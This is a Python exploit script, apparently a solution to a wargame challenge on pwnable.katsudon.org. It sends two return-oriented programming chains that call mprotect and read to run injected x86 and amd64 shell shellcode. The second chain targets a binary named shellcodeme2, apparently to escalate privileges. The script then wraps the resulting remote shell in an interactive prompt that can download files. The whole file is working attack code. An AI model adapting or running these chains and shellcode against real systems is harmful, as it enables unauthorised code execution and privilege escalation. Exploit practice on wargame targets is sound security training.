#!/usr/bin/env python
from sc_pwn import *
import sys
from time import sleep

rhp     = ("pwnable.katsudon.org",33201)

#==========Stage1==========#

def stage1(nc):
    print 'Stage1'
    
    addr_ret        = 0x080484fd
    addr_pop_0xc    = 0x08048312
    addr_mprotect   = 0x08048330
    addr_read       = 0x08048340
    addr_mem_exec   = 0x20000000

    stdin  = 0x0
    length = 0x400


    exploit =   pack_32(addr_ret)
    exploit +=  "\x00"*0xc
    exploit +=  pack_32(addr_mprotect)
    exploit +=  pack_32(addr_pop_0xc)
    exploit +=  pack_32(addr_mem_exec)
    exploit +=  pack_32(length)
    exploit +=  pack_32(0x7)
    exploit +=  pack_32(addr_read)
    exploit +=  pack_32(addr_mem_exec)
    exploit +=  pack_32(stdin)
    exploit +=  pack_32(addr_mem_exec)
    exploit +=  pack_32(length)

    payload = ShellCode('x86').sh()

    sys.stdout.write('[+]sending exploit...\n')
    nc.send(exploit)
    sys.stdout.write('[+]sending payload...\n')
    nc.send(payload)

#==========Stage2==========#

def stage2(nc):
    print 'Stage2'
    
    addr_ret        = 0x0040062c
    addr_pop_rsi_1  = 0x00400691
    addr_pop_rdi    = 0x00400693
    addr_pop_1      = 0x00400692
    addr_mov_rdx    = 0x00400670    #mov r13,rdx    mov %r14,%rsi
                                    #mov %r15d,%edi callq *(%r12,%rbx,8)
    addr_pop_6      = 0x0040068a    #pop rbx,rbp,r12,r13,r14,r15
    addr_mprotect   = 0x004004c0
    addr_read       = 0x00400490
    addr_mem_exec   = 0x20000000
    addr_buf        = 0x00601100

    stdin  = 0x0
    length = 0x400


    exploit =   pack_64(addr_ret)
    exploit +=  "\x00"*0x8

    exploit +=  pack_64(addr_pop_rdi)
    exploit +=  pack_64(stdin)
    exploit +=  pack_64(addr_pop_rsi_1)
    exploit +=  pack_64(addr_buf)
    exploit +=  pack_64(0xdeadbeef)
    exploit +=  pack_64(addr_read)

    exploit +=  pack_64(addr_pop_6)
    exploit +=  pack_64(0x0)
    exploit +=  pack_64(0x0)
    exploit +=  pack_64(addr_buf)
    exploit +=  pack_64(0x7)
    exploit +=  pack_64(length)
    exploit +=  pack_64(addr_mem_exec)
    exploit +=  pack_64(addr_mov_rdx)
    
    exploit +=  pack_64(addr_mprotect)

    exploit +=  pack_64(addr_pop_6)
    exploit +=  pack_64(0x0)
    exploit +=  pack_64(0x0)
    exploit +=  pack_64(addr_buf)
    exploit +=  pack_64(length)
    exploit +=  pack_64(addr_mem_exec)
    exploit +=  pack_64(stdin)
    exploit +=  pack_64(addr_mov_rdx)
    
    exploit +=  pack_64(addr_read)

    exploit +=  pack_64(addr_mem_exec)


    payload = ShellCode('amd64').sh()


    nc.sendln('./shellcodeme2')
    sys.stdout.write('[+]sending exploit...\n')
    nc.send(exploit)
    sleep(1)
    nc.send(pack_64(addr_pop_1))
    sys.stdout.write('[+]sending payload...\n')
    nc.send(payload)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    shlvl=1
    stage1(nc)
    sleep(1)
    
    sh = Shell(nc)
    whoami = sh.command('id').split('(')[3].split(')')[0]
    hostname = sh.command('hostname').split('\n')[0]
    pwd = sh.command('pwd').split('\n')[0]
    while True:
        cmd = raw_input('[%s@%s %s]$ ' % (whoami,hostname,pwd))
        if cmd.split(' ')[0]=='GET':
            sh.download(cmd.split(' ')[1])
                 
        elif cmd.split(' ')[0]=='su':
            stage2(nc)
            sleep(1)
            whoami = sh.command('id').split('(')[3].split(')')[0]
            shlvl += 1
        elif cmd.split(' ')[0]=='cd':
            sh.command(cmd)
            pwd = sh.command('pwd')[:-1]
        elif cmd.split(' ')[0]=='exit':
            nc.sendln('exit')
            if shlvl==1:
                break
            else:
                whoami = sh.command('id').split('(')[3].split(')')[0]
                shlvl -= 1
        else:
            print sh.command(cmd)
    
    del(sh)
    del(nc)

#==========
